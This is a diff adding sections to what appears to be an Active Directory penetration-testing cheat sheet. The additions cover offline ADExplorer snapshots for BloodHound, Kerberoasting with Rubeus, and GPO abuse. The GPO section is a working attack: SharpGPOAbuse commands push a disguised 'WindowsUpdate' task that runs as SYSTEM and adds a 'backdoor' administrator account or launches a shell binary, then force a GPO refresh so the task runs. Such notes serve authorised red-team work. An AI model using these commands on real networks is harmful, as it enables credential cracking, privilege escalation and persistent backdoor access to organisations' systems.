@@ -199,6 +199,17 @@ download C:\Windows\Temp\<timestamp>_BloodHound.zip
 - Find Kerberoastable Users (High Value)
 - Find AS-REP Roastable Users
 
+### ADExplorer offline snapshot
+
+Low-noise alternative to SharpHound — takes a snapshot as any domain user, analyze offline.
+
+```
+# On Windows host: ADExplorer.exe → File → Create Snapshot → save .dat file
+# Transfer .dat to LHOST, convert to BloodHound format:
+ADExplorerSnapshot.py snapshot.dat -o output/
+# Import output/ JSON files into BloodHound normally
+```
+
 ### Kerberoasting
 
 Requests TGS tickets for service accounts (SPNs) — encrypted with service account's NTLM hash.
@@ -210,6 +221,10 @@ impacket-GetUserSPNs -dc-ip $DC_IP $DOMAIN/user:'password' -request -outputfile 
 # Crack
 hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+# Rubeus — AES-only accounts (harder to crack but worth collecting)
+.\Rubeus.exe kerberoast /outfile:krb.txt /nowrap
+.\Rubeus.exe kerberoast /aes /outfile:krb_aes.txt /nowrap
 ```
 
 > Service accounts often have weak passwords and may have over-privileged access.
@@ -341,6 +356,38 @@ Run from a Windows host you control.
 # Monitor for incoming TGTs (unconstrained delegation capture)
 .\Rubeus.exe monitor /interval:5 /filteruser:DC$ /nowrap
 ```
+
+---
+
+## GPO Abuse
+
+If BloodHound shows `GenericWrite` or `WriteProperty` on a GPO object, inject a scheduled task via that GPO.
+
+```bash
+# Identify writable GPOs (from BloodHound: "Outbound Object Control" on a GPO node)
+# Tool: SharpGPOAbuse
+
+# Add a computer-level immediate task running as SYSTEM
+.\SharpGPOAbuse.exe --AddComputerTask \
+  --TaskName "WindowsUpdate" \
+  --Author "NT AUTHORITY\SYSTEM" \
+  --Command "cmd.exe" \
+  --Arguments "/c net user backdoor Password123! /add && net localgroup administrators backdoor /add" \
+  --GPOName "Default Domain Policy"
+
+# Add a user-level task (runs as logged-on user)
+.\SharpGPOAbuse.exe --AddUserTask \
+  --TaskName "UserUpdate" \
+  --Author "DOMAIN\user" \
+  --Command "cmd.exe" \
+  --Arguments "/c C:\Windows\Temp\shell.exe" \
+  --GPOName "Default Domain Controllers Policy"
+
+# Force GPO refresh on target (triggers immediate task execution)
+nxc smb $TARGET_IP -u user -p 'password' -x "gpupdate /force"
+```
+
+> GPO changes apply when: (1) target runs `gpupdate /force`, (2) periodic background refresh (90-120 min), (3) machine reboots.
 
 ---
 
